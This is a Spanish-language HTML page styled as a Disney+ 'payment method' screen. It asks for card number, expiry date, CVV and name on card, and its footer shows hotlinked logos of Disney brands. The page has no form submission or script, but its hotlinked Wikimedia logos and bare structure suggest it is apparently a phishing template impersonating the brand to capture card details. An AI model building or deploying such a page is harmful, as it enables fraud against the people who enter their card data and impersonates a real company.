<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Método de pago | Disney+</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    background: #f1f2f3;
    font-family: 'Inter', sans-serif;
}

/* CONTENEDOR PRINCIPAL */
.container {
    max-width: 430px;
    margin: 40px auto 0 auto;
    background: #fff;
    padding: 30px;
    border-radius: 18px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
}

/* TITULO */
h1 {
    font-size: 24px;
    font-weight: 600;
    color: #000;
}

.sub {
    margin-top: 6px;
    font-size: 15px;
    color: #555;
    line-height: 1.4;
}

/* LABEL */
label {
    font-size: 13px;
    color: #333;
    display: block;
    margin-bottom: 6px;
}

/* INPUT BASE */
input {
    width: 100%;
    padding: 14px;
    border: 1.5px solid #c3c5c8;
    border-radius: 8px;
    font-size: 15px;
    background: #f8f8f9;
    color: #000;
    outline: none;
}

input:focus {
    border-color: #00c8ff;
    background: #fff;
}

/* INPUT TARJETA CON ICONOS */
.input-card {
    position: relative;
}

.input-card input {
    padding-right: 120px;
}

.card-icons {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    display: flex;
    gap: 6px;
}

.card-icons img {
    height: 24px;
    opacity: .9;
}

/* FECHA + CVV LADO A LADO */
.row-double {
    display: flex;
    gap: 14px;
    margin-top: 12px;
}

.field-group { flex: 1; }

/* BOTÓN */
button {
    width: 100%;
    padding: 15px;
    background: #000;
    color: #fff;
    border: none;
    border-radius: 40px;
    font-size: 16px;
    margin-top: 25px;
    cursor: pointer;
    font-weight: 600;
}

button:hover {
    opacity: .85;
}

/* FOOTER */
footer {
    margin-top: 45px;
    text-align: center;
    padding-bottom: 40px;
}

footer img {
    height: 32px;
    opacity: .6;
    margin: 6px;
}

/* RESPONSIVE */
@media(max-width: 450px) {
    .container {
        margin: 20px;
        padding: 25px;
    }

    .row-double {
        gap: 10px;
    }
}
</style>

</head>
<body>

<!-- CONTENEDOR -->
<div class="container">

    <h1>Método de pago</h1>
    <p class="sub">Agrega una tarjeta válida para continuar con la suscripción.</p>

    <!-- TARJETA -->
    <label>NÚMERO DE TARJETA</label>
    <div class="input-card">
        <input type="text" placeholder="•••• •••• •••• ••••">
        <div class="card-icons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
        </div>
    </div>

    <!-- FECHA + CVV -->
    <div class="row-double">
        <div class="field-group">
            <label>FECHA DE VENCIMIENTO</label>
            <input type="text" placeholder="MM/AA" maxlength="5">
        </div>

        <div class="field-group">
            <label>CÓDIGO DE SEGURIDAD</label>
            <input type="text" placeholder="CVV" maxlength="4">
        </div>
    </div>

    <!-- NOMBRE -->
    <div style="margin-top:15px;">
        <label>NOMBRE EN LA TARJETA</label>
        <input type="text" placeholder="Como aparece en la tarjeta">
    </div>

    <!-- BOTÓN -->
    <button>Continuar</button>

</div>

<!-- FOOTER -->
<footer>
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney_wordmark.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/80/ABC_Network_logo.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/ESPN_wordmark.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/MarvelLogo.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Star_Wars_Logo.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/8f/National-Geographic-Logo.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5a/Hulu_Logo.svg">
</footer>

</body>
</html>
